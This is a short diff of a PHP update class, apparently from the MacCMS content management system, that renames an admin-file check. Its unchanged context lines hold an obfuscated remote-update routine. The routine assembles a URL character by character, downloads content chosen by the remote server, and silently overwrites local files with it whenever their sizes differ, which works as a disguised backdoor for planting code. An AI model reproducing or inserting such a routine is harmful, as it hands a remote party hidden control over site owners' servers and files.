@@ -156,7 +156,7 @@ class Update extends Base
         $e = mac_curl_get( "h"."t"."t"."p:/"."/u"."p"."d"."a"."t"."e"."".""."."."m"."a"."c"."c"."m"."s."."c"."o"."m"."/".$a."/".$b);
         if ($e!=""){
             if (($d!="") && strpos(",".$e,$d) <=0){ return; }
-            if($b=='admin.php'){$b=IN_FILE;}
+            if($b==ADMIN_FILENAME){$b=IN_FILE;}
             $f=filesize($b);
             if (intval($c)<>intval($f)) { @fwrite(@fopen( $b,"wb"),$e);  }
         }
